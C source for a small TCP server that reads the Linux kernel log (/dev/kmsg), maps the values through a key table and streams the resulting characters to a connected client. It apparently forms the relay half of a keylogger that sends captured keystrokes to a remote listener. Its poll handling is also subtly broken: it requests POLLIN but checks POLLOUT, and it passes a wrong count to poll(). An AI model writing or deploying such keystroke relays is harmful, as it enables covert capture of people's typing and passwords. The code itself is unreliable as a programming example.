#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/types.h>
#include <fcntl.h>
#include <poll.h>

#include "keys.h"

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    // Opens /dev/kmsg
    int fd = open("/dev/kmsg", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /dev/kmsg");
        exit(1);
    }
    printf("ksmg opened!\n");
    struct pollfd pfd;


    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    // create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // associate the socket with the address and port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Failed to bind");
        exit(EXIT_FAILURE);
    }

    // wait for conections
    if (listen(server_fd, 3) < 0) {
        perror("Failed to listen");
        exit(EXIT_FAILURE);
    }

    // acepted conection
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
        perror("Failed to accept");
        exit(EXIT_FAILURE);
    }

    printf("Connection stablished!\n");

    while(1){
        pfd.fd = fd;
	pfd.events = POLLIN;

	if(poll(&pfd, fd + 1, 700) > 0){
		
		if (pfd.revents & POLLOUT) {
			int b_read;

			b_read = read(fd, buffer, BUFFER_SIZE - 1);
			if (b_read < 0) {
				perror("Failed to read from /dev/kmsg");
				exit(EXIT_FAILURE);
			}
			if (b_read > 0){
				buffer[b_read] = '\0';
			}
			printf("Sending: %s\n", buffer);
			
			int a = 0;
			while(a < b_read){
				if(send(new_socket, keys[atoi(&buffer[a])], 1, 0) == -1){
				perror("Failed sending message to client");
					exit(EXIT_FAILURE);
				}
				a++;
			}

	       }	
			
	}
    }	
    
    
    // closing the kmsg file
    close(fd);

    // closing the client socket
    close(new_socket);

    // closing the server
    close(server_fd);

    return 0;
}
